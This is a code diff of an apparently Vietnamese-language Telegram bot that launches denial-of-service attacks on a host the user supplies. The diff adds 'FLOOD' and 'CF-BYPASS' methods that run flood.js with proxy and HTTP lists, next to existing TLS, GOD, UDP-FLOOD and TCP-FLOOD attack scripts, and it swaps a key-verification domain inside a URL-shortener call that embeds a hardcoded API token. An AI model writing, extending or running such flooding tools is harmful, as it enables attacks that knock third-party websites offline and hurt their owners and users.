@@ -97,7 +97,7 @@ def laykey(message):
     print(key)
     
     try:
-        response = requests.get(f'https://web1s.com/api?token=2e632629-d216-45e7-9657-53dbe55479f9&url=https://anhgit.site/key?key={key}')
+        response = requests.get(f'https://web1s.com/api?token=2e632629-d216-45e7-9657-53dbe55479f9&url=https://darkcyberchris.space/key?key={key}')
         response_json = response.json()
         if 'shortenedUrl' in response_json:
             url_key = response_json['shortenedUrl']
@@ -295,11 +295,16 @@ def attack_command(message):
                 bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
+    if method in ['FLOOD',' TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "TLS.js", host, "90", "64", "5"]
             duration = 90
+        elif method == 'FLOOD':
+            command = ["node", "flood.js", host, "90", "5000", "http.txt", "100000"]
+            duration = 90
+        elif method == 'CF-BYPASS':
+            command = ["node", "flood.js", host, "90", "64", "5", "proxy.txt"]
         elif method == 'GOD':
             command = ["node", "GOD.js", host, "45", "64", "3"]
             duration = 45
